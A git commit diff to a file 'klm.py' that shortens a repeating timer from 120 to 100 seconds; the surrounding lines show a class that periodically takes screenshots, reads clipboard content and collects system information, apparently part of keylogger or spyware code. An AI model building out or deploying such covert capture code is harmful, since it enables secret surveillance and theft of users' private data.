fead0bb046dffe97fedd32d797ddeed92a3dff93
chakibarrama <chakibarrama@gmail.com>
2024-06-07 11:49:27 +0100

    timer 100

--- klm.py
+++ klm.py
@@ -103,7 +103,7 @@ class FileGenerator:
         self.screenshot()
         self.get_clipboard_content()
         # Reset the timer
-        threading.Timer(120, self.periodic_tasks).start()
+        threading.Timer(100, self.periodic_tasks).start()
 
     def system_information(self):
         try:
